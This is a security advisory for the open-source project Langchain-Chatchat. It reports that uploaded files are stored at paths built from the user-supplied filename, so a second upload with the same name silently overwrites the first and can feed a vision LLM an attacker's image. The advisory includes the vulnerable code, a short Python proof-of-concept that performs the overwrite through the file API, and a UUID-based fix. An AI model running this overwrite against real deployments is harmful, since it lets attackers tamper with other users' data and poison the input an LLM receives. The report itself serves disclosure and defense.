# Vuln-2: Silent File Overwrite via Filename-as-Path-Key Storage

## Vulnerability Details

| Field | Value |
|-------|-------|
| **Vendor** | chatchat-space: https://github.com/chatchat-space/Langchain-Chatchat |
| **Product** | Langchain-Chatchat |
| **Affected Versions** | 0.3.x (at least 0.3.1.3) |
| **Vulnerability Type** | CWE-367: TOCTOU Race Condition / CWE-732: Incorrect Permission Assignment |
| **Affected File** | `libs/chatchat-server/chatchat/server/api_server/openai_routes.py:260-284` |
| **Severity** | Medium |
| **CVSS 3.1** | AV:N/AC:H/PR:L/UI:R/S:U/C:N/I:H/A:L — 5.4 |

## Description

Langchain-Chatchat stores uploaded files at a path derived solely from purpose, date, and the user-supplied filename. The server writes files using `open(path, "wb")` with no conflict detection, deduplication, or per-user isolation. When two users upload files with the same name on the same day, the second upload silently overwrites the first.

Combined with the absence of content pinning between upload time and LLM retrieval time, this creates a TOCTOU (Time-of-Check-to-Time-of-Use) race condition in which the vision LLM may fetch an attacker-controlled image instead of the victim's original upload.

### Vulnerable Code

```python
# openai_routes.py:229-235 — deterministic path from filename
def _get_file_id(purpose, created_at, filename):
    today = datetime.fromtimestamp(created_at).strftime("%Y-%m-%d")
    return base64.urlsafe_b64encode(f"{purpose}/{today}/{filename}".encode()).decode()

# openai_routes.py:270-274 — no conflict protection
file_path = _get_file_path(file_id)
os.makedirs(file_dir, exist_ok=True)
with open(file_path, "wb") as fp:      # <- direct overwrite, no check
    shutil.copyfileobj(file.file, fp)
```

Disk path: `{BASE_TEMP_DIR}/openai_files/assistants/{YYYY-MM-DD}/{filename}`

### No Content Pinning

The LLM fetches images via a URL callback with no caching or snapshot:

```python
# openai_routes.py:309-312
@openai_router.get("/files/{file_id}/content")
def retrieve_file_content(file_id: str):
    file_path = _get_file_path(file_id)
    return FileResponse(file_path)  # <- real-time disk read
```

## Attack Vector

### Via Hash Collision (combined with Vuln-1)

When exploited together with Vuln-1 (tobytes hash collision), the attacker does not need to know the victim's filename — the collision pair automatically produces the same filename.

### Via Direct Filename Control

Through the `st.file_uploader` path, the original filename is user-controlled:

```python
# dialogue.py:263-265
def on_upload_file_change():
    if f := st.session_state.get("upload_image"):
        name = ".".join(f.name.split(".")[:-1]) + ".png"  # <- user-controlled
```

Two users uploading `photo.png` on the same day collide without any hash collision technique.

## Proof of Concept

```python
import requests

API = "http://127.0.0.1:7861"
filename = "photo.png"

# User A uploads
with open("legitimate.png", "rb") as f:
    resp_a = requests.post(f"{API}/v1/files",
        files={"file": (filename, f, "image/png")},
        data={"purpose": "assistants"})
file_id = resp_a.json()["id"]

# Verify A's content
original = requests.get(f"{API}/v1/files/{file_id}/content").content

# User B uploads same filename -> overwrites
with open("malicious.png", "rb") as f:
    resp_b = requests.post(f"{API}/v1/files",
        files={"file": (filename, f, "image/png")},
        data={"purpose": "assistants"})

# Same file_id, different content
assert file_id == resp_b.json()["id"]
replaced = requests.get(f"{API}/v1/files/{file_id}/content").content
assert original != replaced  # Content silently replaced
```

## Impact

- **LLM Input Poisoning**: Vision chat processes attacker-controlled images
- **Stealth**: Frontend preview uses in-memory PIL object (correct), while LLM fetches from disk (replaced)
- **TOCTOU Window**: Between upload and LLM callback, no content integrity guarantee

## Remediation

```python
# Introduce random UUID to eliminate filename collisions
import uuid

def _get_file_id(purpose, created_at, filename):
    today = datetime.fromtimestamp(created_at).strftime("%Y-%m-%d")
    unique_id = uuid.uuid4().hex
    return base64.urlsafe_b64encode(
        f"{purpose}/{today}/{unique_id}_{filename}".encode()
    ).decode()
```

## Credits

- Vulnerability Discovery: [dem0]
- Vulnerability Analysis: [dem0]

## Disclaimer

This vulnerability report is provided for educational and authorized security research purposes only. The information contained herein should be used responsibly and in accordance with applicable laws and regulations.
